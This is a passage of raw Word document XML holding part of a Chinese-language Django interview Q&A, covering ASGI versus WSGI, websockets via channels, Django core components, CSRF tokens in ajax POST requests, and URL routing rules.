          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>常用的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>不支持当前</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>开发中的一些新的协议标准。同时，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ASGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>对于</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>原有的模式的支持和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>WebSocket</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的扩展，即</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>ASGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>WSGI</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>的扩展。</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="077A028B" w14:textId="45FBDB77" w:rsidR="00024E97" w:rsidRDefault="00467B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023</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Django</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>如何实现</w:t>
      </w:r>
      <w:r w:rsidR="00024E97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>websocket</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EC053A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实现</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使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>channels</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6356209B"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==channels</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>协议升级到</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协议，保证实时通讯。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A2DCCB9"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 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>也就是说，我们完全可以用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>channels</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>实现我们的即时通讯。而不是使用长轮询和计时器方式来保证伪实时通讯。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4A13BD0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他使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>asgi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>协议而不是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>wsgi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>协议，他通过改造</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框架，使</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既支持</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>http</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>协议又支持</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协议。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7248B8FF"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25.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>列举</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的核心组件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AEDF297" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7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用于创建模型的对象关系映射；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="458070AF" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7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为最终用户设计较好的管理界面；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B6FBDB7" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7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URL</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>设计；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38CE1502" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7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设计者友好的模板语言；</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5508CD8F" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="7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缓存系统。</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="4CA561E9"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27.ajax</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>请求的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>csrf</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>解决方法</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="34"/>
          <w:szCs w:val="34"/>
        </w:rPr>
        <w:t>？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FAA14E3" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="78"/>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首先在你需要发起</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ajax post</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>请求的页面的里面随便一个地方加上</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> {% crsr_token %}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AF04239" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="78"/>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在发起</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">ajax post </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>请求时，组织</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>参数时，将浏览器</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中的值赋予加入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>json</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>中，键名为</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>‘csrfmiddlewaretoken’</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="2E2964FE" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="00024E97">
      <w:pPr>
        <w:widowControl/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="4" w:color="EEEEEE"/>
        </w:pBdr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1" w:line="500" w:lineRule="exact"/>
        <w:contextualSpacing/>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路由层</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0514276A"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01.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>路由优先匹配原则是什么</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7138B76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在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>匹配列表中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>==</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>位置优先匹配</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>==</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E065C6" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="79"/>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如第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条和第</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>条同时满足匹配规则，则优先匹配第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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66AD2CE0" w14:textId="77777777" w:rsidR="00024E97" w:rsidRDefault="00024E97" w:rsidP="0049386C">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="79"/>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如第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条为正则模糊匹配，第</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>条为精确匹配，也是优先匹配第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w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
    </w:p>
    <w:p w14:paraId="1C9F8650"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02.urlpatterns</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>中的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>name</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>与</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>namespace</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>的区别</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EF064FC"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name:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>给路由起一个别名</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namespace:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>防止多个应用之间的路由重复</w:t>
      </w:r>
      <w:hyperlink w:anchor="%E7%9B%AE%E5%BD%95" w:history="1"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="575EDAAE"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lastRenderedPageBreak/>
        <w:t>03.Django</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>路由系统中</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>include</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>是干嘛用的？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CF83BD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include</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>用作路由转发，通常，我们会在每个</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里，各自创建一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:eastAsia="宋体" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:color w:val="333333"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>urls.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
